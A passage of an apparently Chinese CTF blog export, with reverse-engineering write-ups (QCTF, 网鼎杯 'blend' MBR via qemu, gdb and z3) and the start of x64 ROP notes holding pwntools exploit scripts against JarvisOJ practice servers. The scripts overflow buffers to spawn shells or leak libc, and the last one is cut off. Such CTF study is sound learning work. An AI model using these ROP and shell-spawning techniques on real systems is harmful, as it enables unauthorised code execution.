class="number">0xa5</span>,<span class="number">0x85</span>,<span class="number">0xf5</span>,<span class="number">0x3e</span>,<span class="number">0xa5</span>,<span class="number">0x2d</span>,<span class="number">0x3d</span>,<span class="number">0xf5</span>,<span class="number">0x7</span>,<span class="number">0x3c</span>,<span class="number">0x76</span>,<span class="number">0x1d</span>,<span class="number">0x3c</span>,<span class="number">0xf</span>,<span class="number">0x68</span>,<span class="number">0x85</span>,<span class="number">0xa9</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b[] = &#123; <span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x68</span>,<span class="number">0x1e</span>,<span class="number">0xf</span>,<span class="number">0x1d</span>,<span class="number">0xa9</span>,<span class="number">0x13</span>,<span class="number">0x26</span>,<span class="number">0x43</span>,<span class="number">0x3c</span>,<span class="number">0x0</span>,<span class="number">0x14</span>,<span class="number">0x27</span>,<span class="number">0x1c</span>,<span class="number">0x76</span>,<span class="number">0xa5</span>,<span class="number">0x1a</span>,<span class="number">0x0</span>,<span class="number">0x3d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x2d</span>,<span class="number">0x7</span>,<span class="number">0x22</span>,<span class="number">0x0</span>,<span class="number">0x3e</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x28</span>,<span class="number">0x47</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x42</span>,<span class="number">0xf5</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x61</span>,<span class="number">0x0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> t = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span> c = <span class="string">'A'</span>; c &lt;= <span class="string">'_'</span>; c++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i] == b[sub_400936(c)])</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, c);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span> c = <span class="string">'_'</span>; c &lt;= <span class="string">'z'</span>; c++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i] == b[sub_400936(c)])</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, c);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">__<span class="function">int64 <span class="title">sub_400936</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">10</span>);</span><br><span class="line"><span class="keyword">switch</span> (a1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 + <span class="number">35</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">33</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">34</span>:</span><br><span class="line">result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 + <span class="number">10</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">39</span>:</span><br><span class="line">result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 + <span class="number">2</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">44</span>:</span><br><span class="line">result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">4</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">46</span>:</span><br><span class="line">result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">7</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">58</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">59</span>:</span><br><span class="line">result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">21</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">63</span>:</span><br><span class="line">result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">27</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">95</span>:</span><br><span class="line">result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">49</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">if</span> (a1 &lt;= <span class="number">47</span> || a1 &gt; <span class="number">57</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (a1 &lt;= <span class="number">64</span> || a1 &gt; <span class="number">90</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (a1 &gt; <span class="number">96</span> &amp;&amp; a1 &lt;= <span class="number">122</span>)</span><br><span class="line">result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">87</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">55</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">48</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">THAT_GIRL_SAYING_NO_FOT_YOUR_VINDICATE</span><br><span class="line">that_girl_saying_no_fot_your_vindicate</span><br></pre></td></tr></table></figure><ul><li><p>得到flag</p><p>最终flag有两个，如下</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">QCTF&#123;THAT_GIRL_SAYING_NO_FOT_YOUR_VINDICATE&#125;</span><br><span class="line">QCTF&#123;that_girl_saying_no_fot_your_vindicate&#125;</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-blend"><a href="#网鼎杯-blend" class="headerlink" title="网鼎杯 blend"></a>网鼎杯 blend</h2><p>这道题目主要是学习一下SSE指令集和用切qemu模拟运行MBR并用gdb动态调试。</p><ul><li>静态分析</li></ul><p>把文件拖到IDA中，用16位汇编分析，发现其大概逻辑是先判断输入是否是flag开头，然后剩下的部分进行如下判断</p><img src="/未分类题集/1536387720888.png" title="blend_1"><p>但是”cmp     edi, [edx+7DA8h]”这个语句中，被比较数无法确定，所以需要开动态调试确定</p><ul><li>动态调试</li></ul><p>用qemu模拟程序运行并用gdb attach进程进行调试，模拟程序运行的代码如下，-s使得这个程序可以attach</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-i386 -s -drive format=raw,file=./main.bin</span><br></pre></td></tr></table></figure><p>然后打开gdb并执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">set</span> architecture i8086</span><br><span class="line">warning: A handler <span class="keyword">for</span> the OS ABI <span class="string">"GNU/Linux"</span> is not built into this configuration</span><br><span class="line">of GDB.  Attempting to <span class="built_in">continue</span> with the default i8086 settings.</span><br><span class="line"></span><br><span class="line">The target architecture is assumed to be i8086</span><br><span class="line">(gdb) <span class="built_in">set</span> disassembly-flavor intel</span><br><span class="line">(gdb) target remote:1234</span><br><span class="line">Remote debugging using :1234</span><br></pre></td></tr></table></figure><p>然后就可以开始下断点调试，由于MBR代码是从0x7c00处开始的，注意下断点的时候要把ida中显示的offset与起始位置相加。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0x7cB2</span><br><span class="line">Breakpoint 1 at 0x7cb2</span><br><span class="line">(gdb) <span class="built_in">continue</span></span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00007cb2 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) nexti</span><br><span class="line">0x00007cba <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) x/8x 0x7DA8</span><br><span class="line">0x7da8:0x02dd02f60x02dc02e80x02d802ed0x02ce02e2</span><br><span class="line">0x7db8:0x02c402e20x02d402db0x02d902cd0x03110304</span><br></pre></td></tr></table></figure><p>最后就可以根据这些数据编写爆破代码，这里借用z3求解器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">a = Int(<span class="string">'a'</span>)</span><br><span class="line">b = Int(<span class="string">'b'</span>)</span><br><span class="line">c = Int(<span class="string">'c'</span>)</span><br><span class="line">d = Int(<span class="string">'d'</span>)</span><br><span class="line">e = Int(<span class="string">'e'</span>)</span><br><span class="line">f = Int(<span class="string">'f'</span>)</span><br><span class="line">g = Int(<span class="string">'g'</span>)</span><br><span class="line">h = Int(<span class="string">'h'</span>)</span><br><span class="line">i = Int(<span class="string">'i'</span>)</span><br><span class="line">j = Int(<span class="string">'j'</span>)</span><br><span class="line">k = Int(<span class="string">'k'</span>)</span><br><span class="line">l = Int(<span class="string">'l'</span>)</span><br><span class="line">m = Int(<span class="string">'m'</span>)</span><br><span class="line">n = Int(<span class="string">'n'</span>)</span><br><span class="line">o = Int(<span class="string">'o'</span>)</span><br><span class="line">p = Int(<span class="string">'p'</span>)</span><br><span class="line">s.add(a &lt; <span class="number">127</span>)</span><br><span class="line">s.add(b &lt; <span class="number">127</span>)</span><br><span class="line">s.add(c &lt; <span class="number">127</span>)</span><br><span class="line">s.add(d &lt; <span class="number">127</span>)</span><br><span class="line">s.add(e &lt; <span class="number">127</span>)</span><br><span class="line">s.add(f &lt; <span class="number">127</span>)</span><br><span class="line">s.add(g &lt; <span class="number">127</span>)</span><br><span class="line">s.add(h &lt; <span class="number">127</span>)</span><br><span class="line">s.add(i &lt; <span class="number">127</span>)</span><br><span class="line">s.add(j &lt; <span class="number">127</span>)</span><br><span class="line">s.add(k &lt; <span class="number">127</span>)</span><br><span class="line">s.add(l &lt; <span class="number">127</span>)</span><br><span class="line">s.add(m &lt; <span class="number">127</span>)</span><br><span class="line">s.add(n &lt; <span class="number">127</span>)</span><br><span class="line">s.add(o &lt; <span class="number">127</span>)</span><br><span class="line">s.add(p &lt; <span class="number">127</span>)</span><br><span class="line">s.add(a &gt; <span class="number">32</span>)</span><br><span class="line">s.add(b &gt; <span class="number">32</span>)</span><br><span class="line">s.add(c &gt; <span class="number">32</span>)</span><br><span class="line">s.add(d &gt; <span class="number">32</span>)</span><br><span class="line">s.add(e &gt; <span class="number">32</span>)</span><br><span class="line">s.add(f &gt; <span class="number">32</span>)</span><br><span class="line">s.add(g &gt; <span class="number">32</span>)</span><br><span class="line">s.add(h &gt; <span class="number">32</span>)</span><br><span class="line">s.add(i &gt; <span class="number">32</span>)</span><br><span class="line">s.add(j &gt; <span class="number">32</span>)</span><br><span class="line">s.add(k &gt; <span class="number">32</span>)</span><br><span class="line">s.add(l &gt; <span class="number">32</span>)</span><br><span class="line">s.add(m &gt; <span class="number">32</span>)</span><br><span class="line">s.add(n &gt; <span class="number">32</span>)</span><br><span class="line">s.add(o &gt; <span class="number">32</span>)</span><br><span class="line">s.add(p &gt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">abs</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> If(x &gt;= <span class="number">0</span>,x,-x)</span><br><span class="line"></span><br><span class="line">s.add(abs(d<span class="number">-0x22</span>)+abs(c<span class="number">-0xf</span>)+abs(b<span class="number">-0x2</span>)+abs(a<span class="number">-0xc8</span>)+abs(h<span class="number">-0x83</span>)+abs(g<span class="number">-0xfb</span>)+abs(f<span class="number">-0xe0</span>)+abs(<span class="number">0</span><span class="number">-0x83</span>) ==<span class="number">0x304</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0xc0</span>)+abs(o<span class="number">-0x20</span>)+abs(n<span class="number">-0xf</span>)+abs(m<span class="number">-0x10</span>)+abs(l<span class="number">-0xcd</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x13</span>)+abs(<span class="number">0</span><span class="number">-0xb8</span>) ==<span class="number">0x311</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x3</span>)+abs(e<span class="number">-0x4</span>) ==<span class="number">0x2cd</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x00</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(<span class="number">0</span><span class="number">-0x3</span>)+abs(i<span class="number">-0x11</span>) ==<span class="number">0x2d9</span>)</span><br><span class="line"></span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xcd</span>) ==<span class="number">0x2db</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xd9</span>) ==<span class="number">0x2d4</span>)</span><br><span class="line"></span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xdb</span>) ==<span class="number">0x2e2</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xd4</span>) ==<span class="number">0x2c4</span>)</span><br><span class="line"></span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xe2</span>) ==<span class="number">0x2e2</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xc4</span>) ==<span class="number">0x2ce</span>)</span><br><span class="line"></span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xe2</span>) ==<span class="number">0x2ed</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xce</span>) ==<span class="number">0x2d8</span>)</span><br><span class="line"></span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xed</span>) ==<span class="number">0x2e8</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xd8</span>) ==<span class="number">0x2dc</span>)</span><br><span class="line"></span><br><span class="line">s.add(abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xe8</span>) ==<span class="number">0x2f6</span>)</span><br><span class="line">s.add(abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xdc</span>) ==<span class="number">0x2dd</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    model = s.model()</span><br><span class="line">    answer = [model[a],model[b],model[c],model[d],model[e],model[f],model[g],model[h],model[i],model[j],model[k],model[l],model[m],model[n],model[o],model[p],<span class="number">0</span>]</span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    answer_str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(answer)<span class="number">-1</span>):</span><br><span class="line">        answer_str += chr(int(str(answer[i])))</span><br><span class="line">    print(answer_str)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'unsat'</span>)</span><br></pre></td></tr></table></figure><p>得到falg如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;mbr_is_funny__eh&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Binary security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>入门笔记2</title>
      <link href="/%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B02/"/>
      <url>/%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B02/</url>
      <content type="html"><![CDATA[<h1 id="ROP（x64）"><a href="#ROP（x64）" class="headerlink" title="ROP（x64）"></a>ROP（x64）</h1><ul><li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level0</li><li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level2_x64</li><li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level3_x64</li><li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level5</li></ul><a id="more"></a><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote><p>待施工</p></blockquote><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="JarvisOJ-level0"><a href="#JarvisOJ-level0" class="headerlink" title="JarvisOJ level0"></a>JarvisOJ level0</h3><p>发现callsystem函数，函数地址为0x400596，对应的小端序为：\x96\x05\x40\x00；于是可以构造payload=0x88*‘a’ + “\x96\x05\x40\x00”，于是用pwntools编写攻击代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="string">'9881'</span>)</span><br><span class="line">payload = <span class="number">0x88</span>*<span class="string">'a'</span> + <span class="string">"\x96\x05\x40\x00"</span></span><br><span class="line"><span class="comment">#addr  = p64(0x400596)</span></span><br><span class="line"><span class="comment">#payload = 0x88*'a'</span></span><br><span class="line"><span class="comment">#payload = payload+addr</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="JarvisOJ-level2-x64"><a href="#JarvisOJ-level2-x64" class="headerlink" title="JarvisOJ level2_x64"></a>JarvisOJ level2_x64</h3><p>由于x64并不直接由栈传参，而是通过寄存器，所以这道题目和x86最大的不同在于要找到pop rdi; ret这个gadget，首先通过ROPgadget查找pop rdi; ret。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nick@nick-machine:~/wyx/JarvisOJ-pwn-level2_x64$ ROPgadget --binary level2_x64 --only <span class="string">"pop|ret"</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b2 : pop r15 ; ret</span><br><span class="line">0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400560 : pop rbp ; ret</span><br><span class="line">0x00000000004006b3 : pop rdi ; ret</span><br><span class="line">0x00000000004006b1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004a1 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br></pre></td></tr></table></figure><p>可以看到pop rdi; ret的地址为0x00000000004006b3，所以编写exp.py函数如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9882</span>)</span><br><span class="line">level2 = ELF(<span class="string">'level2_x64'</span>)</span><br><span class="line">system_addr = level2.plt[<span class="string">'system'</span>]</span><br><span class="line">pr_addr = <span class="number">0x4006b3</span></span><br><span class="line">binsh_addr = <span class="number">0x600A90</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x88</span> + p64(pr_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="JarvisOJ-level3-x64"><a href="#JarvisOJ-level3-x64" class="headerlink" title="JarvisOJ level3_x64"></a>JarvisOJ level3_x64</h3><p>没有找到pop rsi; pop rdi; pop rdx; ret的gadgets，就用一个pop rsi; ret和一个pop rdi; pop r15; ret</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9883</span>)</span><br><span class="line">level3 = ELF(<span class="string">'level3_x64'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc-2.19.so'</span>)</span><br><span class="line">vulfun_addr = <span class="number">0x4005E6</span></span><br><span class="line">plt_write = level3.plt[<span class="string">'write'</span>]</span><br><span class="line">got_write = level3.got[<span class="string">'write'</span>]</span><br><span class="line">pdr_addr = <span class="number">0x4006b3</span></span><br><span class="line">psr_addr = <span class="number">0x4006b1</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x88</span> + p64(pdr_addr) + p64(<span class="number">1</span>) + p64(psr_addr) + p64(got_write) + p64(<span class="number">0</span>) + p64(plt_write) + p64(vulfun_addr)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u64(p.recv(<span 